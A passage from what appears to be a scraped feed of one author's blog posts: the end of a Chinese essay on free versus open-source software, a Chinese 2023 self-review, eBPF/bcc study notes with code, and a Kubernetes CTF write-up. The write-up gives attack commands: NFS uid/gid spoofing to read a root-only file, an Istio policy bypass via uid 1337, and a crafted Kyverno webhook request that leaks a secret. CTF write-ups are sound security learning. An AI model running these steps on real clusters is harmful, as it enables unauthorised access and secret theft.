读者可以更深刻地理解开源软件与自由软件的异同之处. 由于在实际情况中, 二者都开放了源代码, 大部分情况下也都会采用互相兼容甚至相同的协议, 因此其中的区别在越来越多人眼里逐渐模糊. 如今的软件行业, 大多数人在表达相同意思时更加倾向于使用\u0026quot;Open-source\u0026quot;而不是\u0026quot;Free\u0026quot;这个词, 不仅能够直观清晰地表达信息, 也能避免\u0026quot;Free\u0026quot;这个单词常用的\u0026quot;免费\u0026quot;之意 (为了人们认识到\u0026quot;Free software\u0026quot;中的Free不是免费而是自由的意思, Stallman 可强调了许多次, 但很遗憾, 大部分公司在听到他的强调前就会被吓跑). 但只要了解过自由软件和开源软件的历史, 就能发现其中差距并不在技术而是在道德层面上的分歧.\u003c/p\u003e\n\u003cp\u003e具体来说, 开源运动更加注重软件开发方式的开放性, 一种类似于集市场景中人人可参与的, 以软件质量为最终目标的倡议, 它关注的是软件本身, 因此颇具工程师的纯粹特性; 相反, 自由软件运动不仅仅注重软件开发方式, 更赋予软件本身以道德属性, 它更强调软件用户的自由修改和自由传播的权利, 以\u0026quot;人的自由\u0026quot;为中心, 任何限制软件用户这些权利的个人和组织都是\u0026quot;邪恶\u0026quot;且需要被抵制的, 这让它更像是一种社会运动. 有一句Stallman的话可以很好地阐释其意: \u0026ldquo;如果一个软件是不自由的, 哪怕它的技术非常先进, 我也不会去使用它\u0026rdquo;, 相反, 开源运动的代表人物Linus曾经在一次大会上公开表示自己是Microsoft Powerpoint的粉丝用户, 二者的冲突也由此而来: 在开源主义者眼中, 商业软件是一个不完美的解决方案, 但是在自由软件者眼中, 商业软件则是彻头彻尾的敌人.\u003c/p\u003e\n\u003cp\u003e两种运动并不是互相独立的, 相反, 开源运动脱胎于自由软件运动, 是后者为了适应软件行业商业发展的一种必然演变, 也是追求自由的理想主义者在现实屡屡碰壁后的一种妥协.\u003c/p\u003e\n\u003cp\u003e在今天, 尽管Stallman依旧在全球各地对着众多慕名而来的听众布道, 他也依旧能给人以震撼人心开悟明智的感觉, 但这种感觉过后又有谁会真的去追随他的步伐, 去将自己生活中的所有专有软件清除呢? 要知道, Stallman的攻击目标, 可不仅仅是个人计算机中的专有软件, 任何非自由软件, 不管是汽车上的, 飞机上的, 动车上的, 乃至收音机里的, 都是他的抵制对象. 而对于没有资源的普通人来说, 单是找一台彻头彻尾源码可见(指主板上的固件)的笔记本电脑, 就已经是一件非常困难且完全没有性价比的事情了.\u003c/p\u003e\n\u003cp\u003e从我的角度来看, 虽然很遗憾, 但是自开源运动成长起来后, 自由软件存在的意义就没有以前那么大了, 甚至说的不客气一些, 微乎其微. 这是需要联系历史背景来看的, 在自由软件运动诞生的那个年代, 软件行业极度闭塞, 互联网才刚刚诞生, 各个公司都在自己蒙头闭门造车, 极尽所能保护自家的代码不被公开, 相互之间更不用说有什么兼容合作了. 自由软件的诞生是对那个封闭环境的一种彻头彻尾的反叛, 它以一种偏激的姿态在软件行业逐渐打动了一批人, 也培养起了别具一格更加开放的文化.\u003c/p\u003e","title":"若为自由故, 软件皆可抛"},{"content":"Long time no CTF~~\nRECON Just check the environment related to K8s using env and reconnoiter internal service using dnscan\nThis blog is good written link\nFinding Neighbours According to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to reporting-service.k8s-lan-party.svc.cluster.local.\nAs we all know, all containers within same pod share one network namespace, which means we can sniff the traffic from our current container.\ntcpdump -i any host reporting-service.k8s-lan-party.svc.cluster.local and tcp -w traffic.pcap and the flag was in the traffic.pcap\nDATA LEAKAGE The targeted big corp utilizes outdated, yet cloud-supported technology for data storage in production. But oh my, this technology was introduced in an era when access control was only network-based.\nAt first glance, I thought the data storage is nfs, and found the existence of /efs/flag.txt. However, there is no enough permission to read it, while I failed to mount the remote storage to local host, so I stopped and didn\u0026rsquo;t have any progress until the end of the game.\nBy executing mount, here we got:\nfs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com:/ on /efs type nfs4 (ro,relatime,vers=4.1,rsize=1048576,wsize=1048576,namlen=255,hard,noresvport,proto=tcp,timeo=600,retrans=2,sec=sys,clientaddr=192.168.30.72,local_lock=none,addr=192.168.124.98) Since the remote storage use nfs4, we should specify the version when listing it.\nnfs-ls nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com/?version=4 try to cat the remote flag.txt, but there is no enough permission.\nnfs-cat nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4 However, according to the libnfs document, we could spoof uid and gid by adding parameters to the nfs url and get elevated privileges.\nnfs-cat \u0026#34;nfs://fs-0779524599b7d5e7e.efs.us-west-1.amazonaws.com//flag.txt?version=4\u0026amp;uid=0\u0026amp;gid=0\u0026#34; The Beauty and The Ist Apparently, new service mesh technologies hold unique appeal for ultra-elite users (root users). Don\u0026rsquo;t abuse this power; use it responsibly and with caution.\nThe given policy is\napiVersion: security.istio.io/v1beta1 kind: AuthorizationPolicy metadata: name: istio-get-flag namespace: k8s-lan-party spec: action: DENY selector: matchLabels: app: \u0026#34;{flag-pod-name}\u0026#34; rules: - from: - source: namespaces: [\u0026#34;k8s-lan-party\u0026#34;] to: - operation: methods: [\u0026#34;POST\u0026#34;, \u0026#34;GET\u0026#34;] The policy in this challenge block GET and POST requests from namespace k8s-lan-party Find Istio service\ndnscan -subnet 10.100.0.1/16 The request to this address will be denied. However, there seems to be user that can bypass the Istio\u0026rsquo;s IPTables rules from hist#2.\ncat /etc/passwd | grep 1337\nAnd we got user istio, According to ncc report and Istio Iptables, the 1337 uid is used to distinguish between traffic originating from proxy vs the applications, which means we can bypass the policy restriction by switching to user istio and send requests, which would be recognized as traffic from istio sidercar proxy.\nWho will guard the guardians? Where pods are being mutated by a foreign regime, one could abuse its bureaucracy and leak sensitive information from the administrative services.\nThe given policy:\napiVersion: kyverno.io/v1 kind: Policy metadata: name: apply-flag-to-env namespace: sensitive-ns spec: rules: - name: inject-env-vars match: resources: kinds: - Pod mutate: patchStrategicMerge: spec: containers: - name: \u0026#34;*\u0026#34; env: - name: FLAG value: \u0026#34;{flag}\u0026#34; Kyverno is designed for policy management. The policy will inject flag into Pod resource created under sensitive-ns.\nAccording to GPT, AdmissionReview is a kind of API resource used in admission control process. K8s supports two types of admission control webhooks to handle AdmissionReview: ValidatingAdmissionWebhook and MutatingAdmissionWebhook, the latter is called before validating object correctness, it can modify objects in the request, while the former is called after all MutatingAdmissionWebhook to check the state of the object for validity but does not modify it.\nObviously, the policy facilitates MutatingAdmissionWebhook to modify object.\nReconnoiter services first:\n10.100.86.210 -\u0026gt; kyverno-cleanup-controller.kyverno.svc.cluster.local. 10.100.217.223 -\u0026gt; kyverno-cleanup-controller-metrics.kyverno.svc.cluster.local. 10.100.232.19 -\u0026gt; kyverno-svc.kyverno.svc.cluster.local. 10.100.126.98 -\u0026gt; kyverno-svc-metrics.kyverno.svc.cluster.local. 10.100.158.213 -\u0026gt; kyverno-reports-controller-metrics.kyverno.svc.cluster.local. 10.100.171.174 -\u0026gt; kyverno-background-controller-metrics.kyverno.svc.cluster.local. What if we can utilize the MutatingAdmissionWebhook to steal the secret since we can access to https://kyverno-svc.kyverno.svc.cluster.local/mutate? The AdmissionReview requests to this api will be responsed by object modified by the kyverno, which makes a lot sense.\nuse the following resource to generate AdmissionReview\napiVersion: v1 kind: Pod metadata: name: curl-flag namespace: sensitive-ns spec: containers: - name: curl-container image: curlimages/curl ./kube-review create pod.yaml \u0026gt; pod.json curl -k -X POST \\ https://kyverno-svc.kyverno.svc.cluster.local/mutate \\ -H \u0026#39;content-type: application/json\u0026#39; \\ --data-binary \u0026#34;@pod.json\u0026#34; We got:\n{\u0026#34;kind\u0026#34;:\u0026#34;AdmissionReview\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;admission.k8s.io/v1\u0026#34;,\u0026#34;request\u0026#34;:{\u0026#34;uid\u0026#34;:\u0026#34;dd916513-9b96-4220-ae2b-b21470612d69\u0026#34;,\u0026#34;kind\u0026#34;:{\u0026#34;group\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;Pod\u0026#34;},\u0026#34;resource\u0026#34;:{\u0026#34;group\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;resource\u0026#34;:\u0026#34;pods\u0026#34;},\u0026#34;requestKind\u0026#34;:{\u0026#34;group\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;Pod\u0026#34;},\u0026#34;requestResource\u0026#34;:{\u0026#34;group\u0026#34;:\u0026#34;\u0026#34;,\u0026#34;version\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;resource\u0026#34;:\u0026#34;pods\u0026#34;},\u0026#34;name\u0026#34;:\u0026#34;curl-flag\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;sensitive-ns\u0026#34;,\u0026#34;operation\u0026#34;:\u0026#34;CREATE\u0026#34;,\u0026#34;userInfo\u0026#34;:{\u0026#34;username\u0026#34;:\u0026#34;kube-review\u0026#34;,\u0026#34;uid\u0026#34;:\u0026#34;ee8332cb-afa6-412e-b60a-641f23d28980\u0026#34;},\u0026#34;object\u0026#34;:{\u0026#34;kind\u0026#34;:\u0026#34;Pod\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{\u0026#34;name\u0026#34;:\u0026#34;curl-flag\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;sensitive-ns\u0026#34;,\u0026#34;creationTimestamp\u0026#34;:null},\u0026#34;spec\u0026#34;:{\u0026#34;containers\u0026#34;:[{\u0026#34;name\u0026#34;:\u0026#34;curl-container\u0026#34;,\u0026#34;image\u0026#34;:\u0026#34;curlimages/curl\u0026#34;,\u0026#34;resources\u0026#34;:{}}]},\u0026#34;status\u0026#34;:{}},\u0026#34;oldObject\u0026#34;:null,\u0026#34;dryRun\u0026#34;:true,\u0026#34;options\u0026#34;:{\u0026#34;kind\u0026#34;:\u0026#34;CreateOptions\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;meta.k8s.io/v1\u0026#34;}},\u0026#34;response\u0026#34;:{\u0026#34;uid\u0026#34;:\u0026#34;dd916513-9b96-4220-ae2b-b21470612d69\u0026#34;,\u0026#34;allowed\u0026#34;:true,\u0026#34;patch\u0026#34;:\u0026#34;W3sib3AiOiJhZGQiLCJwYXRoIjoiL3NwZWMvY29udGFpbmVycy8wL2VudiIsInZhbHVlIjpbeyJuYW1lIjoiRkxBRyIsInZhbHVlIjoid2l6X2s4c19sYW5fcGFydHl7eW91LWFyZS1rOHMtbmV0LW1hc3Rlci13aXRoLWdyZWF0LXBvd2VyLXRvLW11dGF0ZS15b3VyLXdheS10by12aWN0b3J5fSJ9XX0sIHsicGF0aCI6Ii9tZXRhZGF0YS9hbm5vdGF0aW9ucyIsIm9wIjoiYWRkIiwidmFsdWUiOnsicG9saWNpZXMua3l2ZXJuby5pby9sYXN0LWFwcGxpZWQtcGF0Y2hlcyI6ImluamVjdC1lbnYtdmFycy5hcHBseS1mbGFnLXRvLWVudi5reXZlcm5vLmlvOiBhZGRlZCAvc3BlYy9jb250YWluZXJzLzAvZW52XG4ifX1d\u0026#34;,\u0026#34;patchType\u0026#34;:\u0026#34;JSONPatch\u0026#34;}} ","permalink":"https://ch3n9w.github.io/posts/ctf-k8s-lan-party/","summary":"\u003cp\u003eLong time no CTF~~\u003c/p\u003e\n\u003ch2 id=\"recon\"\u003eRECON\u003c/h2\u003e\n\u003cp\u003eJust check the environment related to K8s using \u003ccode\u003eenv\u003c/code\u003e and reconnoiter internal service using \u003ccode\u003ednscan\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"recon.png\" alt=\"recon\"  /\u003e\n\u003c/p\u003e\n\u003cp\u003eThis blog is good written \u003ca href=\"https://thegreycorner.com/2023/12/13/kubernetes-internal-service-discovery.html\"\u003elink\u003c/a\u003e\u003c/p\u003e\n\u003ch2 id=\"finding-neighbours\"\u003eFinding Neighbours\u003c/h2\u003e\n\u003cp\u003eAccording to the description, the sidecar container of current pod is sending some information (possibly flag) to remote server. So, the first step is digging the remote server like what we do in the first challenge, which leads me to \u003ccode\u003ereporting-service.k8s-lan-party.svc.cluster.local\u003c/code\u003e.\u003c/p\u003e","title":"k8s lan party"},{"content":" 一事无成的一年, 但也算有所收获, 如果教训也算收获的话.\n2023年给我的感觉是快, 太快了, 兴许是疫情后的这一年里人们积攒许久的劳动热情终于得到了释放, 正式回所的自己也体会到了这种快节奏的生活. 然而自己其实并不能很好的适应, 本科毕业后, 疫情成为了很多事情都不必去做的接口, 渐渐的, 我在这种消极的氛围中变得越来越懒惰. 而今年, 正是充满教训的一年. 除去那些或偶然或侥幸而得的小便宜, 今年的自己可谓是一事无成, 因此, 这篇文章与其是年度总结, 不如说是一篇年度的检讨文.\n缺乏沟通, 闭门造车 这是今年论文进度缓慢的最直接原因, 早在今年年初的时候, 我就有了论文的想法, 但是在没有和师兄与导师充分沟通的情况下只顾自己埋头做, 天马行空的设想和飘忽不定的点子让自己常常东打一棍西打一耙. 结果慢慢悠悠到了八月份的时候导师和我沟通的时候, 只用了几句话就让我汗流浃背, 茅塞顿开, 自己原来在不重要的事情上浪费了这么多的时间和精力! 其实现在想来, 自己闭门造车回避交流的深度心理原因, 也是对自己不自信导致的, 然而回避不能解决问题, 只能解决让问题恶化.\n有鉴于此, 在下一年中, 我必须积极和师兄导师沟通交流分享自己的想法, 当我认识到自己表露出了害羞和回避的心理的时候, 我需要调用自己的理性来克服弱点, 驱动自己向前迈步.\n沉迷配置和游戏, 在无意义的事情上浪费了太多心智 在讨论这点之前, 首先需要明确一下, 比起时间, 我更关注精力的管理. 如果说缺乏沟通是让我在利用精力的战略大方向上出现了偏差, 那么沉迷配置与游戏就是就是战术上的失败. 游戏自不必说, 本来就是消磨精力的发明, 而现代的游戏产业为了迎合越来越多年轻人无处发泄的精力, 研究出了各种令人精疲力尽眼花缭乱的玩法, 着实可怕, 而这其中我今年接触的偏偏是最耗费个人精力的两类游戏: 战旗类(明日方舟) 和 卡牌类(游戏王), 前者消耗精力的程度还不算很多, 因为我也无心深入游玩, 但后者不仅仅是精力杀手, 还是一个无止尽的时间黑洞: 无论是组建卡组还是接触对决过程中遇到的新卡组, 我都需要逼迫自己去阅读晦涩无趣的文本, 更不用说双方回合中的等待时间了.\n那么玩配置又是怎么一回事? 难道对生产力工具进行改良也是不对的吗? 并不是, 适当的配置的确有助于提升生产过程中的体验, 但问题是, 一旦发现自己花在配置上的时间远远超过了价值产出的时间, 那么就应该停下来把精力投入那些真正重要的工作中去. 这也是为什么当我看到 这个视频 的时候深以为然, 极致的效率不仅仅是一个伪需求, 还是一个谎言, 根本不存在这样的东西, 当你的眼里只有工具的时候, 永远有看起来更好的工具用更多的功能(但我可能完全用不到)来吸引我. 对这种东西的追求更是可笑至极, 所谓是君子不器的极端反面, 因为在这种情况下, 人在与工具的交互过程中已经失去了自己的主体地位, 你以为自己是在为了自己去优化启动速度快捷键等东西, 其实你只是沦落为了工具的奴隶, 其本质与沉迷游戏无异. 而恰恰是这些配置, 这些工具, 耗费了我太多的精力去提升和维护, 而往往维护完他们之后我剩下用来工作的时间也没有了, 留给自己的, 只有\u0026quot;我做了事情\u0026quot;的虚假感受, 但实际上, 文字和代码, 一个都没有在写, 自己的产出依旧是0.\n因此, 新的一年里, 我要控制自己调整配置和玩游戏的频率和时间段, 强制自己只能在晚上可以玩这些东西. 游戏仅保留明日方舟, 生产工具固定下来, 少看少关注那些华而不实的工具, 不要再想着求新求变, 而是稳定为王, 实干兴邦. 顺嘴一提, 现在日常使用的工具有:\n桌面环境: 无所谓, wm对于自己不是强需求, hyprland死了我也能回KDE和sway 终端模拟器: kitty shell: zsh 文件管理: lf 编辑器: neovim 浏览器: Brave \u0026amp; Firefox 毕竟, 人是一个适应性很强的生物, 哪怕不用机械键盘, 4k显示器, 顶级的头戴式耳机, 也可以创造价值.\n在真正重要的事情上缺乏毅力和决心 这个问题的根源其实是上述提到过的\u0026quot;在游戏和配置上浪费精力\u0026quot;后导致的直接后果,由于持续性地在不重要的事情上投入了大量的精力, 我时常忘记自己定下的目标, 例如每天看论文, 例如坚持锻炼, 即便偶尔想起并完成, 注意力的黑洞却让自己没有多余的脑力和记忆去回顾, 于是效果寥寥. 久而久之, 自己不仅没得到成长, 也失去了作为一名研究生的基本素质.\n因此, 新的一年里, 每天都应当把最重要的事情提前到工作时间的最开始来进行. 并且最重要的, 是削减对配置与游戏的关注.\n对人际关系的不重视 这是从小到大的问题, 无论是在人际关系上的木讷, 还是记不住别人的信息, 都是不重视的具体表现. 然而世界太大, 鸟人太多, 若还自以为可以不闻不问, 等到时候错过了能人, 遇上了鸟人, 便不要再怨别人. 多打听, 多记录, 可以帮助自己避开破事, 与大佬为伍.\n","permalink":"https://ch3n9w.github.io/posts/gossip-2023-summary/","summary":"\u003cblockquote\u003e\n\u003cp\u003e一事无成的一年, 但也算有所收获, 如果教训也算收获的话.\u003c/p\u003e\n\u003c/blockquote\u003e","title":"2023年度总结"},{"content":"eBPF 是一项革命性的技术, 起源于Linux 内核, 它可以在特权上下文中(如操作系统内核)运行沙盒程序. 它用于安全有效地扩展内核的功能, 而无需通过更改内核源代码或加载内核模块的方式来实现. 从历史上看,由于内核具有监督和控制整个系统的特权,操作系统一直是实现可观测性, 安全性和网络功能的理想场所.\n对ebpf慕名许久, 正好趁寒假拜读一下Learning eBPF, 虽然是基于略过时的框架bcc, 但是在这个过程中学到的知识想必依旧可以迁移到别的框架去.\nBackground and pre-knowledge bcc bcc的ebpf c代码不是真正的C, 而是bcc自己定义的一种和C类似的语言.\nlimitation of ebpf program eBPF 程序必须被验证器校验通过后才能执行，且不能包含无法到达的指令； eBPF 程序不能随意调用内核函数，只能调用在 API 中定义的辅助函数； eBPF 程序栈空间最多只有 512 字节，想要更大的存储，就必须要借助映射存储； 在内核 5.2 之前，eBPF 字节码最多只支持 4096 条指令，而 5.2 内核把这个限制提高到了 100 万条； 由于内核的快速变化，在不同版本内核中运行时，需要访问内核数据结构的 eBPF 程序很可能需要调整源码，并重新编译。 tracepoint and kprobe tracepoint其实就是在Linux内核的一些关键函数中埋下的hook点,这样在tracing的时候,我们就可以在这些固定的点上挂载调试的函数,然后查看内核的信息.\nTracepoint是在内核中固定的hook点, 并不是在所有的函数中都有tracepoint. 这时候, 我们就需要用到kprobe了. kprobe可以动态地在所有的内核函数(除了inline函数)上挂载probe函数\neBPF virtual machine The ebpf virtual machine uses 10 general-purpose registers (0-9), and additional register 10 which was used as a stack frame pointer (can only be read but not written). As a BPF program is executed, values get stored in these registers to keep track of state.\neBPF uses a JIT compiler to convert eBPF bytecode to machine code that runs natively on the target CPU .\nBPF Program and Map references Loading a BPF program into kernel returns a file descriptor, which is a reference to the program and is owned by userspace process. When that process exits, the file descriptor gets released. When there are no references left to BPF program, the kernel removes the program.\nbpftool will pin the program to the filesystem, which creates additional descriptor and the program won\u0026rsquo;t exit even if bpftool exits.\nlibbpf \u0026amp; vmlinux vmlinux.h is drived from the kernel source headers, which includes any kernel data structures or type, and is necessary for eBPF program so that you dont have to write definitions for types like u32, u64 by hand.\nto use any BPF helper functions, it\u0026rsquo;s needed to include header files from libbpf, which includes the definitions of helper functions and is also needed in both user space and eBPF C code.\nBasic Helloworld Hash Table Map Hash Table Map is an highly useful data struction which could be accessed by ebpf program or userspace program.\n#!/usr/bin/python from bcc import BPF from time import sleep program_hello_map = r\u0026#34;\u0026#34;\u0026#34; // define a hash table to store counter data. BPF_HASH(counter_table); int hello(void *ctx) { u64 uid; u64 counter = 0; u64 *p; // a ebpf helper function to obtain uid of current process uid = bpf_get_current_uid_gid() \u0026amp; 0xFFFFFFFF; // update hashtable p = counter_table.lookup(\u0026amp;uid); if (p != 0) { counter = *p; } counter ++; counter_table.update(\u0026amp;uid, \u0026amp;counter); return 0; } \u0026#34;\u0026#34;\u0026#34; b = BPF(text=program_hello_map) # execve is only an interface in linux kernel, # the specific function names vary across different architectures, # thus we should find the function name before attaching it. syscall = b.get_syscall_fnname(\u0026#34;execve\u0026#34;) # attach to execve syscall b.attach_kprobe(event=syscall, fn_name=b\u0026#34;hello\u0026#34;) while True: sleep(2) s = \u0026#34;\u0026#34; # read from hash table for k,v in b[\u0026#34;counter_table\u0026#34;].items(): s += f\u0026#34;ID: {k.value} - {v.value}\\t\u0026#34; print(s) ring buffer maps Ring buffer consists of a buffer, a pointer for written, and pointer for read. The access of data depend on the movement of these two pointers. When a element was read out, the others didn\u0026rsquo;t need to change its location. Data writing may overwrite data that has not been read in a timely manner, which is permissible in some scenarios.\nThe hello world example using ring buffer in book:\nfrom bcc import BPF bpf_code = r\u0026#34;\u0026#34;\u0026#34; BPF_RINGBUF_OUTPUT(output,1); struct data_t { int pid; int uid; char command[16]; char message[12]; }; int hello(void *ctx) { struct data_t data = {}; char message[] = \u0026#34;Hello, perf_event!\u0026#34;; data.pid = bpf_get_current_pid_tgid() \u0026gt;\u0026gt; 32; data.uid = bpf_get_current_uid_gid() \u0026amp; 0xFFFFFFFF; bpf_get_current_comm(\u0026amp;data.command, sizeof(data.command)); bpf_probe_read_kernel(\u0026amp;data.message, sizeof(data.message), message); // write data into ring buffer output.ringbuf_output(\u0026amp;data, sizeof(data), 0); return 0; } \u0026#34;\u0026#34;\u0026#34; b = BPF(text=bpf_code) syscall = b.get_syscall_fnname(\u0026#34;execve\u0026#34;) b.attach_kprobe(event=syscall, fn_name=b\u0026#34;hello\u0026#34;) def print_event(cpu, data, size): # generate the data structure from C declaration automatically # This conversion allows the Python program to access the fields (pid, uid, command, message) of the data_t structure as attributes of the data object in Python. data = b[\u0026#34;output\u0026#34;].event(data) print(f\u0026#34;{data.pid} {data.uid} {data.command.decode()} {data.message.decode()}\u0026#34;) # callback function after reading data b[\u0026#34;output\u0026#34;].open_ring_buffer(print_event) while True: # read from ring buffer, every execution will trigger callback function print_event b.ring_buffer_poll() Ring buffers are preferred over perf buffers for performance reasons, here is the difference in example code\ntail calls bpf_tail_call 是一个 eBPF 提供的机制, 它允许一个 eBPF 程序调用另一个 eBPF 程序, 类似于函数调用. 然而, 与传统的函数调用不同, bpf_tail_call 实际上是将当前程序替换为另一个程序, 而不是创建一个新的函数调用栈帧. 这意味着被调用的程序(尾调用程序)会接管当前程序的执行上下文, 并且当尾调用程序开始执行时, 原始程序的执行就结束了.\nbpf的栈帧空间只有512字节. tail call的通用目的是为了避免当函数递归调用时,栈帧无限地增加(这会导致栈溢出)\nfrom bcc import BPF import ctypes as ct bpf_code = \u0026#34;\u0026#34;\u0026#34; // define maps of type BPF_MAP_TYPE_PROG_ARRAY BPF_PROG_ARRAY(syscall, 300); int hello(struct bpf_raw_tracepoint_args *ctx) { // get opcode of syscall int opcode = ctx-\u0026gt;args[1]; // different tail call according to opcode // This line will be replaced with bpf_tail_call() helper function by bcc bofore compiling. syscall.call(ctx, opcode); // If there is no matched program, then continue execution. bpf_trace_printk(\u0026#34;Another syscall: %d\u0026#34;, opcode); return 0; } int hello_exec(void *ctx) { bpf_trace_printk(\u0026#34;execve syscall\u0026#34;); return 0; } int hello_timer(struct bpf_raw_tracepoint_args *ctx) { if (ctx-\u0026gt;args[1] == 222) { bpf_trace_printk(\u0026#34;Create a timer\u0026#34;); } else if (ctx-\u0026gt;args[1] == 226) { bpf_trace_printk(\u0026#34;Delete a timer\u0026#34;); } else { bpf_trace_printk(\u0026#34;Aome other timer opration\u0026#34;); } return 0; } int ignore_opcode(void *ctx) { return 0; } \u0026#34;\u0026#34;\u0026#34; b = BPF(text=bpf_code) # This time, we attach ebpf program to tracepoint named sys_enter rather than a kprobe b.attach_raw_tracepoint(tp=b\u0026#34;sys_enter\u0026#34;, fn_name=b\u0026#34;hello\u0026#34;) # Get file descriptors of functions ignore_fn = b.load_func(\u0026#34;ignore_opcode\u0026#34;, BPF.RAW_TRACEPOINT) exec_fn = b.load_func(\u0026#34;hello_exec\u0026#34;, BPF.RAW_TRACEPOINT) timer_fn = b.load_func(\u0026#34;hello_timer\u0026#34;, BPF.RAW_TRACEPOINT) prog_array = b.get_table(\u0026#34;syscall\u0026#34;) # put descriptors into map of syscalls prog_array[ct.c_int(59)] = ct.c_int(exec_fn.fd) prog_array[ct.c_int(222)] = ct.c_int(timer_fn.fd) prog_array[ct.c_int(223)] = ct.c_int(timer_fn.fd) prog_array[ct.c_int(224)] = ct.c_int(timer_fn.fd) prog_array[ct.c_int(225)] = ct.c_int(timer_fn.fd) prog_array[ct.c_int(226)] = ct.c_int(timer_fn.fd) # Ignore some syscalls that come up a lot prog_array[ct.c_int(21)] = ct.c_int(ignore_fn.fd) # ...... prog_array[ct.c_int(291)] = ct.c_int(ignore_fn.fd) b.trace_print() Simple XDP program in C Bcc provide a convenient way to write and run ebpf program, however, it would be better to dive deeply in order to have better understand. So, here is a XDP program written in C.\n#include \u0026lt;linux/bpf.h\u0026gt; #include \u0026lt;bpf/bpf_helpers.h\u0026gt; int counter = 0; // define that this is an eXpress Data Path (XDP) program SEC(\u0026#34;xdp\u0026#34;) int hello(void *ctx) { counter++; // same as bpf_trace_printk() in bcc, both of them are wrappers around kernel function `bpf_trace_printk` bpf_printk(\u0026#34;Helloworld %d\u0026#34;, counter); return XDP_PASS; } // define license for this program char _license[] SEC(\u0026#34;license\u0026#34;) = \u0026#34;GPL\u0026#34;; This program do nothing but print variable count everytime the XDP event been triggered, which means a network packet arrives inbound on a network interface.\nAfter writting, we need to compile and load it.\n# compile, here we got the bytecode of the program clang -O2 -target bpf -c hello.bpf.c -o hello.bpf.o # load program into kernel, here the bytecode will be transformed to machine code. bpftool prog load hello.bpf.o /sys/fs/bpf/hello # inspect the loaded program bpftool prog list bpftool prog show id 95 --pretty bpftool prog show name hello # attach to XDP event on a network interface bpftool net attach xdp id 95 dev enp0s31f6 # check the program bpftool net list # check the output cat /sys/kernel/debug/tracing/trace_pipe # check the global variable counter bpftool map dump name hello.bss # detach the program bpftool net detach xdp dev enp0s31f6 bpftool usage # load program into kernel bpftool prog load hello.bpf.o /sys/fs/bpf/hello # inspect the loaded program bpftool prog list bpftool prog show id 95 --pretty bpftool prog show name hello # attach to XDP event on a network interface bpftool net attach xdp id 95 dev enp0s31f6 # check the program bpftool net list # check the global variable counter bpftool map dump name hello.bss # detach the program bpftool net detach xdp dev enp0s31f6 # list btf (bpf type format) bpftool btf list # inspect the contents of BTF information bpftool btf dump id 251 # generate header file from BTF information bpftool btf dump file /sys/kernel/btf/vmlinux format c \u0026gt; vmlinux.h CO-RE (Compile Once, Run Everywhere) eBPF Programs #include \u0026#34;vmlinux.h\u0026#34; #include \u0026lt;bpf/bpf_helpers.h\u0026gt; #include \u0026lt;bpf/bpf_tracing.h\u0026gt; #include \u0026lt;bpf/bpf_core_read.h\u0026gt; char message[12] = \u0026#34;Hello World\u0026#34;; struct { __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY); __uint(key_size, sizeof(u32)); __uint(value_size, sizeof(u32)); } output SEC(\u0026#34;.maps\u0026#34;); struct data_t { int pid; int uid; char command[16]; char message[12]; char path[16]; }; struct user_msg_t { char message[12]; }; // This structure is used to define the map, not map itself // however, my_config can be the map\u0026#39;s reference struct { __uint(type, BPF_MAP_TYPE_HASH); __uint(max_entries, 10240); __type(key, u32); __type(value, struct user_msg_t); } my_config SEC(\u0026#34;.maps\u0026#34;); // Tells the loader to attach to the program to the kprobe in the execve syscall // BPF_KPROBE_SYSCALL is a macro that expands to the correct BPF program type // The first argument is the name of the program: hello // The second argument is the executable pathname for execve syscall SEC(\u0026#34;ksyscall/execve\u0026#34;) int BPF_KPROBE_SYSCALL(hello, const char *pathname) { struct data_t data = {}; struct user_msg_t *p; data.pid = bpf_get_current_pid_tgid() \u0026gt;\u0026gt; 32; data.uid = bpf_get_current_uid_gid() \u0026amp; 0xFFFFFFFF; bpf_get_current_comm(\u0026amp;data.command, sizeof(data.command)); bpf_probe_read_user_str(\u0026amp;data.path, sizeof(data.path), pathname); // my_config is the map\u0026#39;s reference p = bpf_map_lookup_elem(\u0026amp;my_config, \u0026amp;data.uid); if (p != 0) { bpf_probe_read_kernel_str(\u0026amp;data.message, sizeof(data.message), p-\u0026gt;message); } else { bpf_probe_read_kernel_str(\u0026amp;data.message, sizeof(data.message), message); } // submit the data to the user space bpf_perf_event_output(ctx, \u0026amp;output, BPF_F_CURRENT_CPU, \u0026amp;data, sizeof(data)); return 0; } char LICENSE[] SEC(\u0026#34;license\u0026#34;) = \u0026#34;Dual BSD/GPL\u0026#34;; The Makefile\nTARGET = hello-buffer-config ARCH = $(shell uname -m | sed \u0026#39;s/x86_64/x86/\u0026#39; | sed \u0026#39;s/aarch64/arm64/\u0026#39;) BPF_OBJ = ${TARGET:=.bpf.o} USER_C = ${TARGET:=.c} USER_SKEL = ${TARGET:=.skel.h} all: $(TARGET) $(BPF_OBJ) find-map .PHONY: all $(TARGET): $(USER_C) $(USER_SKEL) gcc -Wall -o $(TARGET) $(USER_C) -L../libbpf/src -l:libbpf.a -lelf -lz %.bpf.o: %.bpf.c vmlinux.h clang \\ -target bpf \\ -D __TARGET_ARCH_$(ARCH) \\ -Wall \\ -O2 -g -o $@ -c $\u0026lt; $(USER_SKEL): $(BPF_OBJ) bpftool gen skeleton $\u0026lt; \u0026gt; $@ vmlinux.h: bpftool btf dump file /sys/kernel/btf/vmlinux format c \u0026gt; 